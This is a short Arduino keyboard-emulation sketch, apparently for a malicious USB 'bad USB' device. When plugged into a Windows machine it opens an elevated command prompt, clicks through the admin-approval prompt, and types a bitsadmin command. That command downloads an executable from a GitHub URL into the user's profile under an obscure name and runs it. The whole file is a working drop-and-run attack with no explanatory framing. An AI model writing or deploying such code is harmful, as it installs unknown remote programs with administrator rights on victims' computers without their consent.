
#include <Keyboard.h>
void setup() { 
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    Keyboard.print("cmd");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.release(KEY_LEFT_ARROW);
    delay(200);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();  
    delay(500);
    Keyboard.print("cmd.exe /c bitsadmin /transfer eH /priority foreground https://github.com/pxmkv/JJY.exe/raw/master/JJY.exe %USERPROFILE%\cXUAQSZZXXCXzx.exe && start %USERPROFILE%\cXUAQSZZXXCXzx.exe");
    
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(500);
    Keyboard.end();
 }


void loop() {
  // put your main code here, to run repeatedly:

}
